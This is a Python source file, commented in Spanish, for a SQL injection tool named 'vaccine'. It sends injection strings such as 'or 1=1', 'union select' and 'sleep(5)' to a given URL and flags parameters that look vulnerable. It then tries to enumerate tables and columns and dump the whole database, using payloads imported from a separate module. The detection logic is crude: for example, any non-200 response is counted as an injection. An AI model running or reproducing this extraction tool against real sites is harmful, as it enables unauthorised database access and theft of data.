import argparse
import requests
import logging
from pprint import pprint
from payloads import payloads
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs
from colorama import init, Fore, Style

# Inicializar Colorama para la salida de consola con colores
init(autoreset=True)

# Definir el logger para registrar información detallada
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
handler = logging.StreamHandler()
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

# Función para generar una lista de URLs a probar
def generate_urls(base_url, parameters):
    urls = []
    for param in parameters:
        url = urljoin(base_url, '?' + param)
        urls.append(url)
    return urls

# Función para enviar solicitudes HTTP y detectar inyecciones SQL
def detect_sql_injection(urls):
    vulnerable_params = []
    for url in urls:
        try:
            response = requests.get(url)
            soup = bs(response.text, 'html.parser')
            title = soup.title.string

            # Verificar si la respuesta contiene errores de SQL
            for payload in payloads['error']:
                if payload in response.text:
                    vulnerable_params.append(url)
                    logger.warning(Fore.RED + f"[!] Posible inyección SQL detectada en {url}")
                    break

            # Verificar si la respuesta contiene uniones SQL
            for payload in payloads['union']:
                if payload in response.text:
                    vulnerable_params.append(url)
                    logger.warning(Fore.RED + f"[!] Posible inyección SQL detectada en {url}")
                    break

            # Verificar si la respuesta contiene valores booleanos verdaderos o falsos
            for payload in payloads['boolean']:
                if payload in response.text:
                    vulnerable_params.append(url)
                    logger.warning(Fore.RED + f"[!] Posible inyección SQL detectada en {url}")
                    break

            # Verificar si la respuesta tarda en llegar, lo que indica una inyección basada en tiempo
            for payload in payloads['time']:
                s = requests.Session()
                s.headers.update({'User-Agent': 'Mozilla/5.0'})
                url_with_payload = urljoin(url, '?' + payload)
                response = s.get(url_with_payload)
                if response.elapsed.total_seconds() > 5:
                    vulnerable_params.append(url)
                    logger.warning(Fore.RED + f"[!] Posible inyección SQL detectada en {url}")
                    break

            # Verificar si la respuesta contiene algún error
            if response.status_code != 200:
                vulnerable_params.append(url)
                logger.warning(Fore.RED + f"[!] Posible inyección SQL detectada en {url}")

        except KeyboardInterrupt:
            logger.info(Fore.YELLOW + "[*] El usuario ha interrumpido la ejecución.")
            break
        except Exception as e:
            logger.error(Fore.RED + f"[!] Error al enviar solicitud a {url}: {e}")

    return vulnerable_params

# Función para obtener información adicional en caso de una inyección SQL confirmada
def get_sql_info(url):
    try:
        response = requests.get(url)
        soup = bs(response.text, 'html.parser')
        title = soup.title.string
        logger.info(Fore.GREEN + f"[+] SQL injection confirmada en {url}")
        logger.info(Fore.GREEN + f"[+] Título de la página: {title}")

        # Obtener los parámetros vulnerables
        parsed_url = requests.utils.urlparse(url)
        vulnerable_params = parsed_url.query.split('&')
        logger.info(Fore.GREEN + "[+] Parámetros vulnerables:")
        for param in vulnerable_params:
            logger.info(Fore.GREEN + f"    - {param}")

        # Obtener el payload utilizado
        for payload_type, payload_list in payloads.items():
            for payload in payload_list:
                if payload in response.text:
                    logger.info(Fore.GREEN + f"[+] Payload utilizado: {payload_type}")
                    break

        # Obtener los nombres de las bases de datos, tablas y columnas
        for payload in payloads['database']:
            url_with_payload = urljoin(url, '?' + payload)
            response = requests.get(url_with_payload)
            soup = bs(response.text, 'html.parser')
            tables = soup.find_all('table')
            logger.info(Fore.GREEN + f"[+] Nombres de las tablas para el payload '{payload}':")
            for table in tables:
                logger.info(Fore.GREEN + f"    - {table.get('name')}")

            for table in tables:
                columns = table.find_all('column')
                logger.info(Fore.GREEN + f"[+] Nombres de lascolumnas para la tabla '{table.get('name')}' y el payload '{payload}':")
                for column in columns:
                    logger.info(Fore.GREEN + f"    - {column.string}")

        # Obtener el dump completo de la base de datos
        for payload in payloads['dump']:
            url_with_payload = urljoin(url, '?' + payload)
            response = requests.get(url_with_payload)
            logger.info(Fore.GREEN + f"[+] Dump completo de la base de datos para el payload '{payload}':")
            logger.info(response.text)

    except KeyboardInterrupt:
            logger.info(Fore.YELLOW + "[*] El usuario ha interrumpido la ejecución.")
    except Exception as e:
            logger.error(Fore.RED + f"[!] Error al obtener información adicional en {url}: {e}")

# Función principal para ejecutar el programa
def vaccine(url):
    logger.info(Fore.YELLOW + f"[*] Comenzando la detección de inyecciones SQL en {url}")
    parameters = ['id=1', 'id=1 and 1=1', 'id=1 union select 1,2,3', 'id=1 or 1=1', 'id=1;sleep(5)']
    urls = generate_urls(url, parameters)
    vulnerable_params = detect_sql_injection(urls)
    if len(vulnerable_params) > 0:
        logger.info(Fore.GREEN + f"[+] Se ha encontrado una posible inyección SQL en {len(vulnerable_params)} parámetros.")
        for param in vulnerable_params:
            get_sql_info(param)
    else:
        logger.info(Fore.YELLOW + "[*] No se han encontrado posibles inyecciones SQL.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Detectar y realizar inyecciones SQL en una URL.')
    parser.add_argument('url', help='La URL a probar.')
    args = parser.parse_args()
    vaccine(args.url)